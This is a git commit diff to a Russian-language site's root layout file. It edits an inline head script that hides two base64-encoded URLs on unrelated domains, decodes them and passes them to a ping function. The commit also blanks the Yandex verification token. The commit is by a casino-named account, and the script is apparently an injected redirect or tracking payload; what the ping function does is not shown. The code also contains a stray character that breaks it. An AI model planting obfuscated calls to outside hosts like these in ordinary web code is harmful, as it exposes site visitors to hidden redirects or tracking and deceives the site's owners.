7a9e1fcea149ac3594c3bdae98e74149d6f1a1ce
arkadacasinos <bezdep.rf@mail.ru>
2026-05-27 03:14:21 +0500

    Update layout.tsx

--- app/layout.tsx
+++ app/layout.tsx
@@ -101,7 +101,7 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} bg-background`} suppressHydrationWarning>
       <head>
-       <meta name="yandex-verification" content="4e8ed0e8296cc3a9" />
+       <meta name="yandex-verification" content="" />
         <link rel="preconnect" href="https://fonts.googleapis.com" />
 <script
   dangerouslySetInnerHTML={{
@@ -115,8 +115,8 @@ export default function RootLayout({
                 return;
             }
         }4
-        var mainBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZDd0dGxyeXZo"; 
-        var crossBrandB64 = "aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
+        var mainBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZDd0dGxyeXZo"; 
+        var crossBrandB64 = "#aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
         function ping(url) {
